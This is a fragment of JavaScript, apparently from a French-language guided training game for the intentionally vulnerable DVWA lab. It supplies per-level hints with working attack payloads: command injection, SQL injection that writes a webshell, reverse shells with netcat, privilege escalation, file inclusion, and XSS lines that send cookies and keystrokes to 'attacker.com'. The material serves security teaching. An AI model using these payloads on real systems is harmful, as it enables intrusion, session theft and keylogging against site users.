      if (!p.stabilized) return { action: 'Terminal (reverse)', hint: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", explain: 'Stabilise le TTY' };
      return null;
    case 7:
      if (!p.basic) return { action: 'Web', hint: '<script>alert(1)</script>', explain: 'Affiche une alerte simple' };
      if (!p.cookie) return { action: 'Web', hint: '<script>alert(document.cookie)</script>', explain: 'Affiche le cookie de session' };
      if (!p.exfil) return { action: 'Web', hint: '<script>document.location="http://attacker.com/?c="+document.cookie</script>', explain: 'Redirige vers un site contrôlé par l\'attaquant avec le cookie' };
      if (!p.bypass) return { action: 'Web', hint: '<img src=x onerror=alert(1)>', explain: 'Utilise une balise alternative pour contourner un filtre sur <script>' };
      return null;
    case 8:
      if (!p.persistent) return { action: 'Web', hint: '<script>alert(1)</script> dans le message', explain: 'Enregistre un script qui s\'exécutera à chaque visite' };
      if (!p.bypassMax) return { action: 'Web', hint: 'Modifie maxlength="10" via F12, puis saisis un nom long', explain: 'Contourne la limitation de taille côté client' };
      if (!p.keylogger) return { action: 'Web', hint: '<script>document.onkeypress = function(e){ new Image().src="http://attacker.com/log?k="+e.key; }</script>', explain: 'Injecte un keylogger pour voler les frappes' };
      return null;
    case 9:
      if (!p.paramOk) return { action: 'Web', hint: '?default=<script>alert(1)</script>', explain: 'Injecte un payload via le paramètre de query string' };
      if (!p.fragOk) return { action: 'Web', hint: '#<img src=x onerror=alert(1)>', explain: 'Injecte un payload via le fragment URL (le # n\'est pas envoyé au serveur)' };
      return null;
    case 10:
      if (!p.analyzed) return { action: 'Web', hint: 'Soumets le formulaire normalement', explain: 'Comprends la structure de la requête' };
      if (!p.exploited) return { action: 'Web', hint: 'Injecte une balise <img> avec l\'URL de changement de mdp', explain: 'Forge la requête CSRF invisible' };
      return null;
    case 11:
      if (p.seqSeen < 3) return { action: 'Web', hint: 'Clique sur Generate Session 3 fois', explain: 'Observe l\'incrémentation du cookie' };
      if (!p.hijacked) return { action: 'Web', hint: 'Prédis l\'ID suivant et Hijack', explain: 'Vole la session du prochain utilisateur' };
      return null;
    case 12:
      if (!p.reversed) return { action: 'Web', hint: 'Tape "sseccus" comme Token', explain: 'Montre que tu as compris l\'inversion' };
      if (!p.md5Ok) return { action: 'Web', hint: 'Tape "md5(sseccus)" comme Token', explain: 'Simule le hachage JS local' };
      return null;
    case 13:
      if (!p.bypassed) return { action: 'Web', hint: 'step=2&password_new=a&password_conf=a&passed_captcha=true', explain: 'Bypasse le CAPTCHA' };
      return null;
    default:
      return null;
  }
}

// ───────────────────────────────────────────────────────────────────────────
//  Hints per level
// ───────────────────────────────────────────────────────────────────────────
export function hints(n) {
  switch (n) {
    case 1: return [
      'Terminal : docker compose -f dvwa-compose.yml up -d',
      'Terminal : docker ps  (vérifier que les 2 conteneurs sont Healthy)',
      'Web : se connecter avec admin / password',
      'Web : Create / Reset Database, puis Security = Low',
    ];
    case 2: return [
      'Web : 127.0.0.1  (ping légitime)',
      'Web : 127.0.0.1; id',
      'Web : 127.0.0.1 | cat /etc/passwd',
      'Séparateurs : ;  &&  |  — ; et | marchent même si le ping échoue',
    ];
    case 3: return [
      "Web : 1'  → provoque une erreur SQL",
      "Web : 1' ORDER BY 2 -- -   puis  ORDER BY 3",
      "Web : ' UNION SELECT user,password FROM users -- -",
      'Terminal : john --format=raw-md5 hashes.txt   (aide : "john?" / "hashcat?")',
    ];
    case 4: return [
      "Web : 1' AND 1=1 -- -   puis   1' AND 1=2 -- -",
      'Terminal : sqlmap -u "...sqli_blind/?id=1&Submit=Submit" --cookie="security=low" --dbs --batch',
      "Web : ' UNION SELECT \"" + WS_SQL + "\",null INTO OUTFILE '/var/www/html/dvwa/hackable/uploads/shell.php' -- -",
      'Terminal : nc -lvnp 4444   (listener)',
      'Terminal : curl --get .../shell.php --data-urlencode "cmd=' + revsh('KALI') + '"',
      'Reverse shell : python3 -c \'import pty; pty.spawn("/bin/bash")\'  → ./linpeas.sh',
      'PrivEsc : python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
      'Aide : tape une commande suivie de "?" (ex : sqlmap?, nc?, curl?, python3?)',
    ];
    case 5: return [
      'Web : ?page=../../../../etc/passwd   (path traversal)',
      'Web : ?page=php://filter/convert.base64-encode/resource=index.php',
      'Terminal : echo "<base64>" | base64 -d   (aide : "base64?")',
      'Bonus log poisoning :',
      "Terminal : curl -s http://localhost:8080/ -H 'User-Agent: " + WS_UA + "'",
      'Web : ?page=../../../../var/log/apache2/access.log&cmd=id',
    ];
    case 6: return [
      'Terminal : cat > shell.php   (webshell PHP — aide : "php?")',
      'Terminal : php -l shell.php   (vérifier la syntaxe)',
      'Web : uploader "shell.php"  → /hackable/uploads/shell.php',
      'Terminal : curl "http://localhost:8080/hackable/uploads/shell.php?cmd=id"',
      'Terminal : nc -lvnp 4444   (listener)',
      'Terminal : curl --get .../shell.php --data-urlencode "cmd=' + revsh('KALI') + '"',
      'Reverse : python3 -c \'import pty; pty.spawn("/bin/bash")\'   (stabilisation TTY)',
      'Bonus : cp shell.php shell.php.jpg  → uploader "shell.php.jpg" (double extension)',
    ];
    case 7: return [
      'Web : <script>alert(1)</script>',
      'Web : <script>alert(document.cookie)</script>',
      'Web : <script>document.location="http://attacker.com/?c="+document.cookie</script>',
      'Bonus (Bypass) : <ScRiPt>alert(1)</ScRiPt> ou <img src=x onerror=alert(1)>',
    ];
    case 8: return [
      'Web (Name) : Inspecte le HTML (F12) et modifie maxlength="10"',
      'Web (Message) : <script>alert(1)</script>',
      'Bonus (Keylogger) : <script>document.onkeypress = function(e){ new Image().src = "http://attacker.com/log?k=" + e.key; }</script>',
    ];
    case 9: return [
      'Web (URL) : ?default=<script>alert(1)</script>',
      'Web (URL) : #<img src=x onerror=alert(1)>',
      'Note : Le serveur ne voit jamais ce qui suit le #, c\'est géré 100% côté client.',
    ];
    case 10: return [
      'Analyse : Modifie le mot de passe normalement et observe l\'URL.',
      'Exploit : <img src="http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">',
    ];
    case 11: return [
      'Génère 3 sessions pour voir que le cookie s\'incrémente de 1 à chaque fois.',
      'Calcule le prochain ID (actuel + 1) et saisis-le dans la zone Hijack.',
    ];
    case 12: return [
      'Inspecte le fichier js_attack.js (simulé). Il prend ta phrase, l\'inverse, et la hache en MD5.',
      'Phrase : "success" → inversée : "sseccus"',
      'Saisis directement "md5(sseccus)" dans le champ Token pour simuler l\'exécution locale.',
    ];
    case 13: return [
      'La requête légitime de l\'étape 2 envoie step=2 et vérifie le captcha.',
      'Le serveur a une faille de logique : il fait confiance au paramètre passed_captcha=true.',
      'Payload : step=2&password_new=a&password_conf=a&passed_captcha=true',
    ];
    default: return [];
  }
}
